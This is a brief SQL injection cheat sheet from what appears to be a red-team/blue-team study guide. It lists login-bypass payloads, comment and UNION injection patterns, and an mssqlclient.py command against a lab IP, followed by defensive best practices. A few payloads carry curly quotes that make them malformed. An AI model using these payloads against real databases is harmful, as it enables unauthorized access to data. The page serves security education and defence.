# RedTeam

**>> Full Cheat Sheet: [www.netsparker.com/blog](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)**

## SQL Types
1. MySQL
2. SQL Server
3. PostgreSQL
4. Oracle
5. Others


## SQL Injection: Quick and Dirty
```
admin' --
admin' #
admin'/*
' or 1='1
' or 1=1--
' or 1=1#
' or 1=1/*
') or ‘1’ =’1--
') or (‘1’=’1--
' || 1=’1
```

## SQL Attack Patterns

#### Comment
```
1) --
2) /*  */
3) #
```

#### Combine Queries 
- `SELECT * FROM xyz ; SELECT * FROM abc`

#### UNION injections
- You can poison query to return records from different tables
- `SELECT username, admin FROM members UNION SELECT password, admin FROM members`


## Tools

#### mssqlclient.py
- `python3 mssqlclient.py USER@10.10.10.27 -windows-auth`
- `SELECT IS_SRVROLEMEMBER('sysadmin')`
   - Output "1" = yes

#### sqlmap

*Check out: [3_Exploitation/Web Application](https://github.com/p-arrow/Red-Blue-Guide/blob/main/3_Exploitation/Web%20Application.md)*

<br />

# BlueTeam

## Best Practice

1. Use parameterized SQL Statements
2. Implement Input-Validation 
3. Minimal DB access rights 
4. Deactivate unnecessary standard features of your DB server
5. Patch your DB Server continuously
